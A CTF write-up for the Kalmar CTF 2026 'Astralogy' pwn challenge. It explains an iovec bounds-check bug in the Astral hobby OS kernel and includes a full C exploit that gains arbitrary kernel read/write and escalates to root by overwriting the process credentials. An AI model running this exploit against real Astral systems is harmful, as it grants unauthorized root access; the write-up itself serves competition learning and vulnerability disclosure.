---
title: "Astralogy"
date: 2026-03-29
event: "Kalmar CTF 2026"
category: "pwn"
difficulty: "medium"
author:
 - VulnX
tags:
  - ctf
  - writeup
  - pwn
  - kernel
description: "A 0 day in Astral OS, for Kalmar CTF 2026"
---

# Astral OS pwn

> Do you believe in horoscopes? Me neither. Anyways, have fun breaking yet another hobby OS :) <br />
> 
> [https://github.com/Mathewnd/Astral](https://github.com/Mathewnd/Astral) <br />
> `nc pwn.chal-kalmarc.tf 1337`



# Challenge Overview

| Challenge  | Astralogy |
| ---------- | --------- |
| Category   | Pwn       |
| Points     | 165       |
| Solves     | 73        |
| Difficulty | Medium    |

---

# Provided Files

## challenge.iso

```
challenge.iso: ISO 9660 CD-ROM filesystem data (DOS/MBR boot sector) 'ISOIMAGE' (bootable)
```

## hardening.patch

```diff
diff --git a/kernel-src/arch/x86-64/cpu.c b/kernel-src/arch/x86-64/cpu.c
index 2a5fe25..684b2b7 100644
--- a/kernel-src/arch/x86-64/cpu.c
+++ b/kernel-src/arch/x86-64/cpu.c
@@ -196,7 +196,7 @@ void arch_cpu_init() {
 	wrmsr(MSR_STAR, star);
 	wrmsr(MSR_LSTAR, (uint64_t)arch_syscall_entry);
 	wrmsr(MSR_CSTAR, 0); // no compatibility mode syscall handler
-	wrmsr(MSR_FMASK, 0x200); // disable interrupts on syscall
+	wrmsr(MSR_FMASK, 0x600); // disable interrupts and DF on syscall
 
 	// enable SSE
 	asm volatile(
@@ -205,7 +205,7 @@ void arch_cpu_init() {
 		"or  $2, %%eax;"
 		"mov %%rax, %%cr0;"
 		"mov %%cr4, %%rax;"
-		"or  $0b11000000000, %%rax;"
+		"or  $0x100600, %%rax;"
 		"mov %%rax, %%cr4;"
 		: : : "rax");
 
diff --git a/kernel-src/sys/syscalls/pread.c b/kernel-src/sys/syscalls/pread.c
index 09964e8..3edfb6e 100644
--- a/kernel-src/sys/syscalls/pread.c
+++ b/kernel-src/sys/syscalls/pread.c
@@ -10,6 +10,11 @@ syscallret_t syscall_pread(context_t *context, int fd, void *buffer, size_t size
 		.ret = -1
 	};
 
+	if (IS_USER_ADDRESS(buffer) == false) {
+		ret.errno = EFAULT;
+		return ret;
+	}
+
 	file_t *file = fd_get(fd);
 
 	if (file == NULL || (file->flags & FILE_READ) == 0) {
diff --git a/kernel-src/sys/syscalls/pwrite.c b/kernel-src/sys/syscalls/pwrite.c
index 6604ef3..be45fd6 100644
--- a/kernel-src/sys/syscalls/pwrite.c
+++ b/kernel-src/sys/syscalls/pwrite.c
@@ -8,6 +8,11 @@ syscallret_t syscall_pwrite(context_t *context, int fd, void *buffer, size_t siz
 		.ret = -1
 	};
 
+	if (IS_USER_ADDRESS(buffer) == false) {
+		ret.errno = EFAULT;
+		return ret;
+	}
+
 	file_t *file = fd_get(fd);
 
 	if (file == NULL || (file->flags & FILE_WRITE) == 0) {
```

## run.sh

```bash
#!/bin/sh

exploit=$(mktemp)
cp "${1:-/dev/null}" "$exploit"
[ $(stat -c%s "$exploit") -lt 4096 ] && truncate -s 4096 "$exploit"

trap 'rm -f "$exploit"' EXIT INT TERM

qemu-system-x86_64 \
    -M q35 \
    -m 256M \
    -smp cpus=1 \
    -cpu qemu64,+smep -enable-kvm \
    -cdrom challenge.iso -boot dc \
    -drive file="$exploit",format=raw,read-only,if=none,id=nvme \
    -device virtio-blk,serial=deadc0ff,drive=nvme \
    -nographic -monitor none \
    -s \
    -d int,cpu_reset,guest_errors
```

Clearly the hardening patch does 3 things:

1. Disable DF (Direction Flag): This is standard x86_64 to ensure string operations are performed in the right order in kernel. [See](https://0xax.gitbooks.io/linux-insides/content/Booting/linux-bootstrap-4.html):
   
   > In the beginning of the `startup_32` function, we can see the `cld` instruction which clears the `DF` bit in the [flags](https://en.wikipedia.org/wiki/FLAGS_register) register. When the direction flag is clear, all string operations like [stos](http://x86.renejeschke.de/html/file_module_x86_id_306.html), [scas](http://x86.renejeschke.de/html/file_module_x86_id_287.html) and others will increment the index registers `esi` or `edi`. We need to clear the direction flag because later we will use strings operations to perform various operations such as clearing space for page tables.

2. Enable [SMEP](https://en.wikipedia.org/wiki/Control_register#SMEP) support. This is also a standard practice to prevent raw `ret2usr` attacks.

3. Add the much needed checks in `pread` / `pwrite` to ensure that user-space writes to/from user-space memory (NOT kernel memory). Without this patch, the kernel is effectively vulnerable to arbitrary memory read/write by (ab)using these 2 system calls.

## Extracting more information

If we mount the `challenge.iso` file as read-only:

```shell
$ mkdir iso_mount
$ sudo mount -o loop,rw challenge.img iso_mount
```

we can extract the kernel ELF (with debug symbols 🙏):

```shell
$ file iso_mount/astral 
iso_root/astral: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped
```

and the `initrd` filesystem:

```shell
$ file iso_mount/initrd 
iso_root/initrd: POSIX tar archive
```

There's really nothing fancy in `initrd` besides `/etc/rc`:

```bash
#!/usr/bin/bash

mkdir -p /dev
mount /dev devfs
chmod 0755 /dev

mkdir -p /dev/shm
mount /dev/shm tmpfs
chmod 1777 /dev/shm

mkdir -p /tmp
mount /tmp tmpfs
chmod 1777 /tmp

chmod 0755 /dev/pts

if [ -b /dev/vioblk0 ]; then
  cp /dev/vioblk0 /home/astral/exploit
  chown astral:astral /home/astral/exploit
  chmod +x /home/astral/exploit
fi
```

which just sets up the `exploit` file so that we can pass the binary from outside the VM as:

```shell
$ ./run.sh exploit
```

and it will be located at: `~/exploit` inside the VM.

> NOTE: There is some issue with how the passthrough works so the file needs to be page aligned. While developing the exploit, I just appended `truncate -s 65536 exploit` in my make command to fix this.

---

# Vulnerability

Hunting for the actual vulnerability took me too long. I was genuinely disappointed to see the slop solves on kernel pwn, so that caused some delay as well :(

But eventually, my teammate [Technet](https://x.com/Technet8394) reminded that the OS might be too big to look for bugs, so read the hardening patch again.

The patch itself doesn't seem to *introduce* any vulnerability, but I noticed something odd. It enables `SMEP` to prevent ret2usr but deliberately choose to ignore [SMAP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention). This decision to "allow" `SMAP` and patch `IS_USER_ADDRESS(...)` in "only one" call site seemed to suggest that there may be other places where this check is missing. If we can find a way to trigger it, we might be able to get arbitrary read/write primitives.

> The kernel is not configured with KASLR so arbitrary read/write is sufficient to do LPE.

---

# Investigating system calls

The syscall list can be found at `kernel-src/arch/x86-64/syscall.asm`. Following are the syscalls related to I/O:

```
extern syscall_read
extern syscall_write
extern syscall_pread
extern syscall_pwrite
extern syscall_writev
extern syscall_readv
```

`syscall_read` and `syscall_write` already have the `IS_USER_ADDRESS(...)` correctly setup, so that only leaves `readv/writev`.

```c
syscallret_t syscall_writev(context_t *context, int fd, iovec_t *uiov, int iovec_count) {
	syscallret_t ret = {
		.ret = -1
	};
	file_t *file = NULL;

	iovec_t *iovec = alloc(sizeof(iovec_t) * iovec_count);
	if (iovec == NULL) {
		ret.errno = ENOMEM;
		return ret;
	}

	ret.errno = usercopy_fromuser(iovec, uiov, sizeof(iovec_t) * iovec_count);
	if (ret.errno)
		goto cleanup;

	size_t buffer_size = iovec_size(iovec, iovec_count);
	if (buffer_size == 0) {
		ret.errno = 0;
		ret.ret = 0;
		goto cleanup;
	}

	if (iovec_user_check(iovec, iovec_count) == false) {
	/*  ^^^^^^^^^^^^^^^^  */
		ret.errno = EFAULT;
		goto cleanup;
	}

	file = fd_get(fd);
...
```

Both `readv` and `writev` internally call `iovec_user_check` which does:

```c
bool iovec_user_check(iovec_t *iovec, size_t count) {
	for (int i = 0; i < count; ++i) {
		// POSIX says that when len is zero, the addr can be an invalid buffer
		if (iovec->len && IS_USER_ADDRESS(iovec[i].addr) == false)
			return false;
	}

	return true;
}
```

to ensure that the provided address is valid. The comment also makes sense, if the length is zero, then effectively no data will be transferred, so there's really no need for the pointer to be valid. However, the implementation is messed up. If you look closely, `iovec` is an array of type `iovec_t`:

```c
typedef struct {
	void *addr;
	size_t len;
} iovec_t;
```

To check the length of individual entries, they should have used `iovec[i]->len` instead of `iovec->len`.

## What happens now?

As per the [GNU C manual](https://www.gnu.org/software/gnu-c-manual/gnu-c-manual.html#Member-Access-Expressions), chapter 3.16:

> You can also access the members of a structure or union variable via a pointer by using the indirect member access operator `->`. <br/>
> `x->y` is equivalent to `(*x).y`.

So the length check expands to: `(*iovec).len`.

And `*iovec` is another way of writing `iovec[0]`.

So overall the if-condition becomes:

```c
if (iovec[0].len && IS_USER_ADDRESS(iovec[i].addr) == false)
```

which is obviously wrong! For every `iovec` it uses the length field of the first `iovec`. If the first `iovec` has length 0, we effectively bypass the `IS_USER_ADDRESS(...)` check on all subsequent `iovec` elements.

> If you are interested, the patch introducing this vulnerability can be found [here](https://github.com/Mathewnd/Astral/commit/da78348122ab4b46894cfca0e38612cc81d5b60e). <br />
> It was merged about 3 months prior to the CTF.

---

# Building Primitives

Let's start off by creating a temporary file to read/write data:

```c
tmp_fd = sys_openat(AT_FDCWD, "tmpfile", O_RDWR | O_CREAT | O_TRUNC, 0666);
```

## Arbitrary Read

To read kernel memory, we will use the `writev` system call, and pass in the desired kernel memory in `vec[1].addr`, while ensuring that `vec[0].len = 0`. After that, the data should be written in the temp file. We can leak it by reading from the file.

```c
void arb_read(void *addr) {
	vec[0].addr = NULL;
	vec[0].len = 0;
	vec[1].addr = addr;
	vec[1].len = sizeof(leak);
	sys_writev(tmp_fd, vec, 2);
	sys_pread(tmp_fd, &leak, sizeof(leak), 0);
}
```

## Arbitrary Write

Writing to kernel memory is the same as reading from it, with the only difference being the use of `readv` system call.

```c
void arb_write(void *addr, void *data, size_t size) {
	sys_pwrite(tmp_fd, data, size, 0);
	vec[0].addr = NULL;
	vec[0].len = 0;
	vec[1].addr = addr;
	vec[1].len = size;
	sys_readv(tmp_fd, vec, 2);
}
```

---

# Privilege Escalation

Now, how do we get root? To answer this, start by remembering, what are the common "data-only attacks" in Linux to achieve LPE?

- Dirty file?
- Dirty pagetable?

Well yes, but that would be overkill here. We could instead, simply, walk the `task` list and overwrite our current task's `struct cred` with forged data.

The structures are a bit different in this OS (as compared to Linux), so we have to walk the following chain:

```
thread_t -> proc_t -> cred_t
```

```c
typedef struct thread_t {
	...
	struct proc_t *proc;
	...
} thread_t;
```

```c
typedef struct proc_t {
	...
	cred_t cred;
	...
} proc_t;
```

```c
typedef struct {
	int uid, euid, suid;
	int gid, egid, sgid;
} cred_t;
```

## How to get `current`?

If you have spent sometime looking at the codebase, you must have surely come across the usage of `current_thread()`:

```c
static inline thread_t *current_thread(void) {
	thread_t *thread;
	asm volatile ("mov %%gs:0, %%rax" : "=a"(thread) : : "memory");
	return thread;
}
```

So it gets the current thread from `GS` register at offset `0`. As per [OSDev Wiki](https://wiki.osdev.org/SWAPGS):

> ... the GS register often holds a base address to a structure containing per-CPU data.

Conveniently, the per-CPU state is being tracked in `kernel-src/main.c` as:

```c
static cpu_t bsp_cpu;
```

So reading from this kernel address (known to us because of no KASLR) will give us the same leak for `thread_t`.

Hence we build the following chain:

```c
// -- leak current thread --
arb_read((void *)0xffffffff800b2de0);
// -- leak current proc --
arb_read(leak + 48);
// -- cred = leak + 52 --
```

Once we have the address for `cred`, we can overwrite the current process's UID and GID with 0:

```c
arb_write(leak + 52, &root_cred, sizeof(root_cred));
```

BOOM! We are root!

## Full solve script

```c
#include <fcntl.h>
#include <stddef.h>

#define SYSCALL_OPENAT		 2
#define SYSCALL_SEEK		 4
#define SYSCALL_EXIT		13
#define SYSCALL_PREAD		76
#define SYSCALL_PWRITE		77
#define SYSCALL_WRITEV		97
#define SYSCALL_READV		98

typedef struct {
	void *addr;
	size_t len;
} iovec_t;

typedef struct {
	int uid, euid, suid;
	int gid, egid, sgid;
} cred_t;

int tmp_fd, flag_fd;
iovec_t vec[2] = { 0 };
void *leak;
cred_t root_cred = { 0 };
char flag[0x100];

long sys_openat(int dirfd, const char *path, int flags, int mode) {
	long ret;

	asm volatile(
		"mov %1, %%rax\n"
		"mov %2, %%rdi\n"
		"mov %3, %%rsi\n"
		"mov %4, %%rdx\n"
		"mov %5, %%r10\n"
		"syscall\n"
		"mov %%rax, %0\n"
		: "=r"(ret)
		:
			"i"(SYSCALL_OPENAT),
			"r"((long)dirfd),
			"r"(path),
			"r"((long)flags),
			"r"((long)mode)
		: "rax", "rdi", "rsi", "rdx", "r10", "rcx", "r11", "memory"
	);

	return ret;
}

void sys_exit(int status) {
	asm volatile(
		"mov %0, %%rax\n"
		"mov %1, %%rdi\n"
		"syscall\n"
		:
		: "i"(SYSCALL_EXIT), "r"((long)status)
		: "rax", "rdi", "rcx", "r11"
	);
}

long sys_seek(int fd, long offset, int whence) {
	long ret;

	asm volatile(
		"mov %1, %%rax\n"
		"mov %2, %%rdi\n"
		"mov %3, %%rsi\n"
		"mov %4, %%rdx\n"
		"syscall\n"
		"mov %%rax, %0\n"
		: "=r"(ret)
		:
			"i"(SYSCALL_SEEK),
			"r"((long)fd),
			"r"(offset),
			"r"((long)whence)
		: "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
	);

	return ret;
}

long sys_writev(int fd, iovec_t *vec, int vlen) {
	long ret;

	sys_seek(fd, 0, SEEK_SET);
	asm volatile(
		"mov %1, %%rax\n"
		"mov %2, %%rdi\n"
		"mov %3, %%rsi\n"
		"mov %4, %%rdx\n"
		"syscall\n"
		"mov %%rax, %0\n"
		: "=r"(ret)
		:
			"i"(SYSCALL_WRITEV),
			"r"((long)fd),
			"r"(vec),
			"r"((long)vlen)
		: "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
	);

	return ret;
}

long sys_readv(int fd, iovec_t *vec, int vlen) {
	long ret;

	sys_seek(fd, 0, SEEK_SET);
	asm volatile(
	"mov %1, %%rax\n"
	"mov %2, %%rdi\n"
	"mov %3, %%rsi\n"
	"mov %4, %%rdx\n"
	"syscall\n"
	"mov %%rax, %0\n"
	: "=r"(ret)
	:
		"i"(SYSCALL_READV),
		"r"((long)fd),
		"r"(vec),
		"r"((long)vlen)
	: "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
	);

	return ret;
}

long sys_pread(int fd, void *buf, long count, long offset) {
	long ret;

	asm volatile(
	"mov %1, %%rax\n"
	"mov %2, %%rdi\n"
	"mov %3, %%rsi\n"
	"mov %4, %%rdx\n"
	"mov %5, %%r10\n"
	"syscall\n"
	"mov %%rax, %0\n"
	: "=r"(ret)
	:
		"i"(SYSCALL_PREAD),
		"r"((long)fd),
		"r"(buf),
		"r"(count),
		"r"(offset)
	: "rax", "rdi", "rsi", "rdx", "r10", "rcx", "r11", "memory"
	);

	return ret;
}

long sys_pwrite(int fd, void *buf, long count, long offset) {
	long ret;

	asm volatile(
		"mov %1, %%rax\n"
		"mov %2, %%rdi\n"
		"mov %3, %%rsi\n"
		"mov %4, %%rdx\n"
		"mov %5, %%r10\n"
		"syscall\n"
		"mov %%rax, %0\n"
		: "=r"(ret)
		:
			"i"(SYSCALL_PWRITE),
			"r"((long)fd),
			"r"(buf),
			"r"(count),
			"r"(offset)
		: "rax", "rdi", "rsi", "rdx", "r10", "rcx", "r11", "memory"
	);

	return ret;
}

void arb_read(void *addr) {
	vec[0].addr = NULL;
	vec[0].len = 0;
	vec[1].addr = addr;
	vec[1].len = sizeof(leak);
	sys_writev(tmp_fd, vec, 2);
	sys_pread(tmp_fd, &leak, sizeof(leak), 0);
}

void arb_write(void *addr, void *data, size_t size) {
	sys_pwrite(tmp_fd, data, size, 0);
	vec[0].addr = NULL;
	vec[0].len = 0;
	vec[1].addr = addr;
	vec[1].len = size;
	sys_readv(tmp_fd, vec, 2);
}

void _start() {
	// -- create tmp file --
	tmp_fd = sys_openat(AT_FDCWD, "tmpfile", O_RDWR | O_CREAT | O_TRUNC, 0666);
	
	// -- leak current thread --
	arb_read((void *)0xffffffff800b2de0);
	// -- leak current proc --
	arb_read(leak + 48);
	// -- cred = leak + 52 --
	// -- overwrite UID:GID with 0 --
	arb_write(leak + 52, &root_cred, sizeof(root_cred));

	// -- WIN --
	flag_fd = sys_openat(AT_FDCWD, "/root/flag.txt", O_RDONLY, 0);
	sys_pread(flag_fd, flag, sizeof(flag), 0);
	sys_pwrite(tmp_fd, flag, sizeof(flag), 0);
}
```

Compile and truncate to page align the binary:

```shell
$ gcc -s -nostdlib -static -fno-stack-protector -o exploit exploit.c
$ truncate -s 65536 exploit
```

# Demo

```

                      .::.    root@astral
                   .:'  .:    -----------
    *    MMM8&&.::'  .:'      OS: Astral
       MMMM.::'&&  .:'        Kernel: Astral
      MM..:'88&&&&&&          Uptime: secs
     M.:'MM88&&&&&&           Shell: bash 5.1.0
    .:'MMMM88&&&&&&       *   Memory: MiB / MiB
  .:'  MMMMM88&&&&
.:' * .:'MMM8&&&'
:'  .:'
'::'                *

-bash: cannot set terminal process group (31): Operation not permitted (EPERM)
-bash: no job control in this shell
astral@astral:~>./exploit
./exploit
astral@astral:~>cat tmpfile
cat tmpfile
kalmar{more_holes_than_swiss_cheese..._feel_free_to_share_your_exploit_in_a_ticket!}
astral@astral:~>
```

---

Overall this was a very solid challenge, thanks Kalmarunionen for hosting this event, and of course for the LOW-LLM policy, that made the CTF fun again, after a long time.

---
